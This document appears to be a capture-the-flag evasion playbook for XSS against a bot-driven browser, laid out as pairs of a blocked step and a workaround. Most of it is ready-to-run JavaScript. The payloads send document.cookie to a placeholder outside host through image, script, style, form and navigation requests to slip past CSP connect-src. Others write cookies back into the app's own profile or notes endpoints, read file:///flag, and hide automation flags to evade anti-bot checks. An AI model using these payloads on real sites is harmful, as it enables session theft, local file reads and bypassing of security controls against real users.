# Evasion scenarios — the block, the pivot, the payload

## Scenario: CSP `connect-src` blocks the fetch

**Block**: `Refused to connect to 'https://T' because it violates
connect-src` in the console.

**Pivot**: `connect-src` governs `fetch`/`XHR`/`sendBeacon`; `img-src`,
`script-src`, `style-src`, `form-action` are separate and often looser.

```javascript
new Image().src='https://T/i.png?c='+document.cookie;      // img-src
var s=document.createElement('script');s.src='https://T/j.js?c='+document.cookie;document.body.append(s); // script-src
var l=document.createElement('link');l.rel='stylesheet';l.href='https://T/s.css?c='+document.cookie;document.head.append(l); // style-src
var f=document.createElement('form');f.action='https://T/';f.method='POST';/*...*/f.submit(); // form-action
top.location='https://T/?c='+document.cookie;               // navigation — no CSP directive blocks it
```

Read the CSP header from the rendered page — the surviving directive
names the channel.

## Scenario: all external egress filtered

**Block**: every outbound request fails — `requestfailed` to your
tunnel, `RESP:0`, no listener hit. DNS may still resolve.

**Pivot**: the flag never leaves — stash it on the app's own origin.

```javascript
// write-back to a profile field / note / setting you can fetch
fetch('/api/profile',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({bio:document.cookie})});
fetch('/api/notes',{method:'POST',body:'n='+document.cookie});
```

Then fetch the store yourself — the app is the channel. If even
same-origin writes are blocked, a DNS exfil through a resolver you
watch is the last channel.

## Scenario: tunnel interstitial

**Block**: `goto`/`fetch` your tunnel returns a "click to continue"
page, not your body — a headless client cannot pass it.

**Pivot**: a tunnel without a confirm page (a paid tier, a raw
`ssh -R`/port-forward, a self-hosted listener). The check is the fix:
`goto` your own URL inside the driver and read the body — only a body
that is yours is a live channel.

## Scenario: `file://` navigation blocked

**Block**: `nav file:///...` returns an error page or a scheme block.

**Pivot**: the JS file read is a separate primitive:

```javascript
return fetch('file:///flag').then(r=>r.text());        // via execute/async
return new Promise(d=>{var x=new XMLHttpRequest();x.open('GET','file:///flag');x.onload=()=>d(x.responseText);x.send();});
```

When both nav and `fetch` are blocked, the file read is dead — pivot
to the `localhost`/origin HTTP surface instead.

## Scenario: `localhost` reads sandboxed

**Block**: the driver is configured to allow only the app's origin —
`localhost` and external `http://` both refuse.

**Pivot**: the reachable set is the app's own origin — read the routes
it serves on that origin (`/admin`, `/debug`, `/flag`), and use the
browser's authenticated context as the foothold.

## Scenario: the bot hides `navigator.webdriver`

**Block**: the challenge's anti-bot logic differs for detectable
drivers — a payload gated on "is a real browser" behaves differently.

**Pivot**: match the bot's flags in the reproduction —
`--disable-blink-features=AutomationControlled` if the bot hides the
tell — so the reproduction is the same environment the payload faces.

## The scenario-to-pivot map

| Block | Pivot |
|---|---|
| connect-src CSP | img/script/style/form/nav |
| all egress | same-origin write-back; DNS |
| interstitial | a tunnel without it; raw listener |
| file:// nav | `execute` `fetch("file://")` |
| localhost sandbox | the app's own origin |
| webdriver tell | match the bot's flags |
